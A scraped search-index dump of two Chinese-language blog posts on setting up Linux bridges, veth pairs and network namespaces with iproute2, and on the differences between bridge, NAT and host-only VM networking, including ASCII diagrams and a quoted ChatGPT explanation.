實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"指令解說 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:1:0","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"安裝路由工具 這邊說明一下兩個工具安裝方法，這邊假如你要用新方法iproute2通常不需要再額外安裝。 iproute2 sudo apt-get install -y iproute2 舊方法。 bridge-utils sudo apt-get install -y bridge-utils ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:1:1","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"新增網橋 bridge-utils 裡面提供 brctl去控制 bridge操作，這邊br和ctl方便去記，簡單來說就是bridge control。現在很多台電腦沒有這個指令，可以用新方法。 # \u003cname\u003e 放 bridge 名稱 brctl addbr \u003cname\u003e Tip brctl 相關指令，通常加了加錯要想辦法還原，這邊特別紀錄一下，雖然重開機就會還原就是了。 # show 顯示 bridge 資訊 brctl show \u003cname\u003e # 刪除 bridge brctl delbr \u003cname\u003e # 顯示全部 bridge brctl show 新方法使用 ip link help 看相關指令。還滿多的要找不好找，建議可以看範例用。 root@primary:~# ip link help Usage: ip link add [link DEV | parentdev NAME] [ name ] NAME [ txqueuelen PACKETS ] [ address LLADDR ] [ broadcast LLADDR ] [ mtu MTU ] [index IDX ] [ numtxqueues QUEUE_COUNT ] [ numrxqueues QUEUE_COUNT ] type TYPE [ ARGS ] # br_name 放 bridge 名稱 ip link add name \u003cbr_name\u003e type bridge ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:1:2","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"新增兩對veth ip link add veth0-ns type veth peer name veth0-br 這段真的比較複雜，我們從help去看，可以看到大概樣子。 root@primary:~# ip link help Usage: ip link add [link DEV | parentdev NAME] [ name ] NAME [ txqueuelen PACKETS ] [ address LLADDR ] [ broadcast LLADDR ] [ mtu MTU ] [index IDX ] [ numtxqueues QUEUE_COUNT ] [ numrxqueues QUEUE_COUNT ] type TYPE [ ARGS ] root@primary:~# ip link help veth Usage: ip link \u003coptions\u003e type veth [peer \u003coptions\u003e] To get \u003coptions\u003e type 'ip link add help' 這邊我們看name也可以省略，如果從ip link \u003coptions\u003e type veth [peer \u003coptions\u003e]來看，你會發現可以省略更多東西。最後指令可以下ip link add type veth，只是 veth 建立出來會是系統幫你命名。 ubuntu@primary:~$ sudo ip link add type veth ubuntu@primary:~$ ip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever ..... 3: veth0@veth1: \u003cBROADCAST,MULTICAST,M-DOWN\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether ca:f3:02:de:74:7e brd ff:ff:ff:ff:ff:ff 4: veth1@veth0: \u003cBROADCAST,MULTICAST,M-DOWN\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 92:83:9e:54:a5:90 brd ff:ff:ff:ff:ff:ff ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:1:3","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"將veth的一端移動到netns中 ip link set veth0-ns netns ns0 root@primary:~# ip link set help ... ip link set { DEVICE | dev DEVICE | group DEVGROUP } [ { up | down } ] [ type TYPE ARGS ] .... [ netns { PID | NAME } ] ... ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:1:4","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"將netns中的本地環回和veth啟動並組態IP # ip netns exec ns2 ip addr add 10.0.0.3/24 dev veth2-ns # 這邊就不寫出 netns 指令出來 ip addr add 10.0.0.3/24 dev veth2-ns ubuntu@primary:~$ ip addr help Usage: ip address {add|change|replace} IFADDR dev IFNAME [ LIFETIME ] [ CONFFLAG-LIST ] ip address del IFADDR dev IFNAME [mngtmpaddr] ip address {save|flush} [ dev IFNAME ] [ scope SCOPE-ID ] [ to PREFIX ] [ FLAG-LIST ] [ label LABEL ] [up] ip address [ show [ dev IFNAME ] [ scope SCOPE-ID ] [ master DEVICE ] [ type TYPE ] [ to PREFIX ] [ FLAG-LIST ] [ label LABEL ] [up] [ vrf NAME ] ] ip address {showdump|restore} IFADDR := PREFIX | ADDR peer PREFIX [ broadcast ADDR ] [ anycast ADDR ] [ label IFNAME ] [ scope SCOPE-ID ] [ metric METRIC ] SCOPE-ID := [ host | link | global | NUMBER ] FLAG-LIST := [ FLAG-LIST ] FLAG FLAG := [ permanent | dynamic | secondary | primary | [-]tentative | [-]deprecated | [-]dadfailed | temporary | CONFFLAG-LIST ] CONFFLAG-LIST := [ CONFFLAG-LIST ] CONFFLAG CONFFLAG := [ home | nodad | mngtmpaddr | noprefixroute | autojoin ] LIFETIME := [ valid_lft LFT ] [ preferred_lft LFT ] LFT := forever | SECONDS 這邊可以看到 add ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:1:5","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"將veth的另一端啟動並掛載到網橋上 ip link set veth0-br master br0 從這指令看到中間用 master 字眼做串接 ip link set { DEVICE | dev DEVICE | group DEVGROUP } [ { up | down } ] [ type TYPE ARGS ] ..... [ master DEVICE ][ vrf NAME ] Info 後來有爬到這篇可以看相關範例指令。 計算機網路 - Network Namespace - HackMD Network bridge - Arch Linux 中文维基 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:1:6","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"簡單繪圖 原本想說跟上篇一樣一個一個畫，不過後來覺得不需要。照著做也能可以了解。 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:2:0","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"加分題 host 連接到 br0 你做到這邊會發現你 host 主機沒辦法連相關 IP ，假如你都會操作設定br0了，你應該也能設定。這邊可以自己試試看。 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:3:0","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"設定 br0 設定 br0 IP。 ip addr add 10.0.0.4/24 dev br0 接下來你也能 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:3:1","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"額外建立 veth pair 相連 ip link add name veth-3 type veth peer name veth-br3 ip link set veth-br3 master br0 ip addr add 10.0.0.4/24 dev veth3 ip link set veth-3 up ip link set veth-br3 up 這樣設定完就可以 ping了 root@primary:~# ping 10.0.0.3 PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.298 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.099 ms ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:3:2","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"深入 Bridge 其他議題 在整理這篇也有看很多東西，但是花很多時間在這邊實作演示。原本主要是讓我的 KVM Bridge ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:4:0","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"ARP 運作 Linux 虛擬網絡設備之 bridge - 閱坊裡面有提到 ping，裡面 arp 相關東西，這邊找了相關東西 (51) When do you need the ARP protocol? -Wireshark - YouTube 我覺得介紹還滿簡單易懂，推薦看這個影片 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:4:1","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"br0 為什麼可以設定 IP bridge必須要組態IP嗎？ 在我們常見的物理交換機中，有可以配置IP和不能配置IP兩種，不能配置IP的交換機一般通過com口連上去做配置（更簡單的交換機連com口的沒有，不支持任何配置），而能配置IP的交換機可以在配置好IP之後，通過該IP遠程連接上去做配置，從而更方便。 bridge就屬於後一種交換機，自帶虛擬網卡，可以配置IP，該虛擬網卡一端連在bridge上，另一端跟協議棧相連。和物理交換機一樣，bridge的工作不依賴於該虛擬網卡，但bridge工作不代表機器能連上網，要看組網方式。 參考: Linux虚拟网络设备之bridge(桥) - Linux程序员 - SegmentFault 思否 推薦看裡面文章，其實後面很想針對一些 Case 做實作，但花的時間超出預期，所以就特別放在這邊。 我之前聽朋友說到網路孔不能設定 IP，那就是 L2 設備，但從不能配置IP的交換機一般通過com口連上去做配置（更簡單的交換機連com口的沒有，不支持任何配置）這段話感覺還是能做到的。但這邊不確定是不是真的這樣，我也沒辦法實驗。 Info 我原本 Google 搜尋 Linux Bridge 找到 Linux 虛擬網絡設備之 bridge - 閱坊備份圖 ，但後來發現這個好像是轉貼的。下面有原本連結，內容介紹更多。 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:4:2","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"筆電 wifi 不能做 bridge Linux kernel 不允許無線網路以 managed mode 進行橋接。但我們等下就會設定 hostapd 讓無線網路進入 master mode，因此這個錯誤暫時無視即可。 在 Linux 上設置無線橋接器 | electronic_blue Tip Bing AI: 您可以使用以下命令來查看網路卡的模式： iwconfig To add a wireless interface to a bridge, you first have to assign the wireless interface to an access point or start an access point with hostapd. Otherwise the wireless interface will not be added to the bridge. Network bridge - ArchWiki Linux系统将WiFi配置为AP模式 — hostapd 和 udhcpd的使用说明_浮云流响的博客-CSDN博客 這邊 wifi 用熱點模式就有非我想要的。所以後來我改網路孔去做 bridge。 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:4:3","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"相關連結 linux - Howto setup a `veth` virtual network - Super User linux虚拟网络设备 | 好记忆不如烂笔头 | 问题记录，学习笔记 Linux network namespace， veth， birdge与路由-赵化冰的博客 | Zhaohuabing Blog (52) How to Bridge internet from wireless laptop to a wired device - YouTube WIFI對有線網路橋接動作，有空來記錄。 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:5:0","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 實作","uri":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/"},{"categories":["網路"],"content":"之前架設 KVM 網路是用預設 NAT架構，在連線上外面是連不到 VM的。但我都需要在預設閘道路由表多設定 192.168.122.x/24指定到 VM 路由上面。這個做法感覺不是很方便，然後還要特別設定路由去連，前正子剛好在找 KVM 可以直接讓電腦網路方法，剛好看到用 Bridge 可以解決我這個問題。但是 Bridge 和 NAT 他們架構圖分不是很清楚，這邊就先做個簡單整理。 ","date":"2023-09-14","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/:0:0","tags":["網路","bridge","nat"],"title":"網路 Bridge 和 NAT 差異","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/"},{"categories":["網路"],"content":"一般常見虛擬網路三種模式 常見模式有三種: Bridge(橋接) 一般可以把它當作Hub，設備連接就能連線。 NAT 網路地址轉換 (Network Address Translation) 出去流量都會做SNAT，出去IP 都會被做置換。外面 IP 是進不來的。通常會要有人做 DHCP 分配 IP，但大多 VM 都幫你做好了。 Warning 其實還是有方法可以進來的，VM Host 通常有轉發功能，只要在路由表設定 VM IP 路由區段導向 VM Host主機，簡單來說就是把安裝 VM 那台主機當作路由器，但通常不會這樣做，可能管理上也不好管理，我家一開始用這個方法，但被我懂網路朋友吐槽這個不是很優的方案。 Host-only 主機跟 VM 相連，這個有點跟之前做 veth pair差不多原理。每建一台 VM 用這個模式，你電腦都會多一個網路卡。 這邊不打算深入介紹，簡單說明我了解部分。建議可以看虛擬機的網路模式(Host-only,Bridged,NAT) - HackMD。 備份圖 Info 以前玩VM都不是很了解這三種模式，什麼方案可以讓 VM 吃到外面網路，一堆網路操作感覺都很複雜，不過最近了解Bridge和NAT就了解了是用什麼原理讓網路連線。Host-only每次建立完，怎麼控制台會多個介面卡??一直都不是很懂，現在都了解了。 ","date":"2023-09-14","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/:1:0","tags":["網路","bridge","nat"],"title":"網路 Bridge 和 NAT 差異","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/"},{"categories":["網路"],"content":"三種模式差異 其實之前介紹就能看出差異，從虛擬機的網路模式(Host-only,Bridged,NAT) - HackMD這篇裡面可以看到簡單理解這三種模式差異。 Bridged NAT Host-only 是否可以連到外網 可以 可以 不行 主機與虛擬機是否在同一網段 相同 不同 不同 IP設置 手動 DHCP自動配發 DHCP自動配發 我一開始看這篇 bridge 和 NAT 不知差異在哪邊。 +----------------------------------------------------------------+ | | | +------------------------------------------------+ | | | Newwork Protocol Stack | | | +------------------------------------------------+ | | ↑ ↑ | |.........................|...........................|..........| | ↓ ↓ | | +------+ +--------+ +-------+ +-------+ | | | | | .3.101 | | | | .3.102| | | +------+ +--------+ +-------+ +-------+ | | | eth0 |\u003c---\u003e| br0 |\u003c---\u003e| veth0 | | veth1 | | | +------+ +--------+ +-------+ +-------+ | | ↑ ↑ ↑ | | | | | | | | +------------+ | | | | +------------|---------------------------------------------------+ ↓ Physical Network 上面圖我跟你說這是Bridge圖。 本來我還覺得我可以在 br0 上面的 eth0加上IP，再設定 iptable 做 NAT 大錯特錯想法。NAT圖是不是長這樣的 下面有NAT 圖樣子 Tip 之前說 bridge 不能設定 IP，但是br0可以設定 IP，有點推翻之前說的。雖然我沒有爬到原因，但我猜測 host 看到的 br0是指 host 的孔，我原本以為還要自己建 veth去跟 br0 做連接，看來是不用的。 我目前在想 br0能設定 IP，其實這算是 bridge的 wlan孔?假如是這個概念，那所有bridge設定 gateway到那邊去也是很合理，然後送出封包照 host 路由表做派送。 我後來又仔細想想 bridge 孔，br0應該是指 Bridge 網卡，後來爬到一篇文章，說網路恐有設定 IP 的話，會跟Newwork Protocol Stack最連結。 當然這篇 裡面也有 NAT 架構圖。這邊我們看 br0 設定一個 IP，eth0不是接到br上面，這邊看 VM 和 docker0 橋接器都是這樣做的。 下面這個就是 NAT 圖示。 +----------------------------------------------------------------+-----------------------------------------+-----------------------------------------+ | Host | Container 1 | Container 2 | | | | | | +------------------------------------------------+ | +-------------------------+ | +-------------------------+ | | | Newwork Protocol Stack | | | Newwork Protocol Stack | | | Newwork Protocol Stack | | | +------------------------------------------------+ | +-------------------------+ | +-------------------------+ | | ↑ ↑ | ↑ | ↑ | |............|.............|.....................................|...................|.....................|....................|....................| | ↓ ↓ | ↓ | ↓ | | +------+ +--------+ | +-------+ | +-------+ | | |.3.101| | .9.1 | | | .9.2 | | | .9.3 | | | +------+ +--------+ +-------+ | +-------+ | +-------+ | | | eth0 | | br0 |\u003c---\u003e| veth | | | eth0 | | | eth0 | | | +------+ +--------+ +-------+ | +-------+ | +-------+ | | ↑ ↑ ↑ | ↑ | ↑ | | | | +-------------------------------------------+ | | | | | ↓ | | | | | | +-------+ | | | | | | | veth | | | | | | | +-------+ | | | | | | ↑ | | | | | | +-------------------------------------------------------------------------------|--------------------+ | | | | | | | | | | | | | | | | +------------|---------------------------------------------------+-----------------------------------------+-----------------------------------------+ ↓ Physical Network (192.168.3.0/24) Linux Network Namespace 与 Bridge 网桥 - 墨天轮 ","date":"2023-09-14","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/:1:1","tags":["網路","bridge","nat"],"title":"網路 Bridge 和 NAT 差異","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/"},{"categories":["網路"],"content":"網路孔不是每個孔都能設定 IP 之前跟我朋友討論網路東西，有時會提醒網路設備不是每個孔都能設定 IP，都是 bridge 也是一樣道理，所以 eth0 放在 bridge 不能加上 IP。WAN孔才能加上 IP。LAN孔沒辦法設定 IP。 ","date":"2023-09-14","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/:2:0","tags":["網路","bridge","nat"],"title":"網路 Bridge 和 NAT 差異","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/"},{"categories":["網路"],"content":"AI問答區 公司有買免費 ChatGPT，免費白不問?😆但能確定我思考是一致的。 Linux bridge和 Nat差異？ Linux bridge（Linux 橋接）和 NAT（Network Address Translation，網絡地址轉換）是在 Linux 系統中常見的兩種網絡技術，它們有以下主要差異： 功能： Linux bridge：Linux 橋接可以實現局域網（LAN）上的兩個或多個網絡介面卡（NIC）之間的互聯。它將它們視為一個虛擬的交換機，並轉發數據包在這些網絡介面之間。 NAT：NAT 是一種網絡地址轉換技術，常用於連接兩個網絡，將源 IP 地址和/或端口號轉換為目標 IP 地址和/或端口號。這通常用於在私有網絡中共享一個公有 IP 地址，或在防火牆上實現基於 IP 地址的安全限制。 網絡層： Linux bridge：Linux 橋接工作在 OSI 模型的第二層（數據鏈路層），基於 MAC 地址來轉發數據包。 NAT：NAT 工作在 OSI 模型的第三層（網絡層），基於 IP 地址和端口號進行地址轉換。 網絡拓撲： Linux bridge：Linux 橋接可以在同一個 LAN 上互聯多個網絡介面，形成一個擴展的局域網。它可以實現雙向通信，並允許數據包在 LAN 中進行轉發。 NAT：NAT 主要用於連接兩個網絡，通常是在連接內部私有網絡和外部公有網絡之間進行轉換。它只在數據包從內部網絡進入外部網絡或相反方向時進行轉換。 總結來說，Linux bridge 是一種用於虛擬交換機的技術，可以在同一個 LAN 上互聯不同的網絡介面；而 NAT 是一種將 IP 地址和端口號進行轉換的技術，常用於連接兩個網絡，允許內部網絡共享一個公有 IP 地址。這些技術可以根據需要在 Linux 系統中彼此組合使用，以實現特定的網絡配置。 所以是bridge上面的eth都不能設定IP? 在 Linux 橋接上的網絡介面（如 eth0）通常不需要配置 IP 地址，因為橋接是運作在第二層（數據鏈路層），基於 MAC 地址轉發數據包，而不涉及 IP 層。 對於 Linux 橋接，IP 地址通常是配置在橋接器（如 br0）上的。橋接器是一個虛擬網絡介面，用於管理和連接不同的網絡介面。你可以在橋接器上配置 IP 地址，作為它與其他網絡的入口。當數據包在橋接器和其他網絡介面之間轉發時，IP 層的訊息是根據目的地 MAC 地址來查找的，而不是根據 IP 地址。 